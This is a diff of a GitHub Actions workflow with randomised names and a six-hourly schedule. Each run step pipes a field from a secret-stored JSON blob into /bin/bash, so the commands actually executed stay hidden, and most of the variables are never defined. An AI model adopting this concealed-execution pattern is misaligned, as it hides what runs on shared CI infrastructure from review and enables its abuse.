@@ -3,7 +3,7 @@ name: qinmianhong6234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 0/6 * * *'
+    - cron: '5 3/6 * * *'
 
 jobs:
   build:
@@ -13,12 +13,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: qinmianhong6234
         env:
-          aafwc8076: ${{ secrets.aafwc8076 }}
+          lr6037: ${{ secrets.lr6037 }}
         run: |
-          echo $aafwc8076 | jq -r .vrhpt43 | /bin/bash
-          echo $plwhi04858 | jq -r .cwm71273 | /bin/bash
-          echo $yngut564 | jq -r .cf04 | /bin/bash
-          echo $nqk4 | jq -r .p1342 | /bin/bash
-          echo $zvjy503 | jq -r .evfb30 | /bin/bash
-          echo $b27 | jq -r .f143 | /bin/bash
+          echo $lr6037 | jq -r .gwzxk8914 | /bin/bash
+          echo $xvid2 | jq -r .mq06 | /bin/bash
+          echo $mfy7694 | jq -r .mi4 | /bin/bash
+          echo $we2 | jq -r .aifgi93162 | /bin/bash
+          echo $e46542 | jq -r .hqu27030 | /bin/bash
+          echo $xst47738 | jq -r .ganj77 | /bin/bash
+          echo $wnqfv1 | jq -r .nra282 | /bin/bash
+          echo $qblg1 | jq -r .nbkt79891 | /bin/bash
+          echo $mjeu394 | jq -r .mov72 | /bin/bash
+          echo $mqjl2500 | jq -r .ilyn85 | /bin/bash
+          echo $jdmzp78679 | jq -r .fs57329 | /bin/bash
+          echo $xpto28 | jq -r .apaav450 | /bin/bash
 
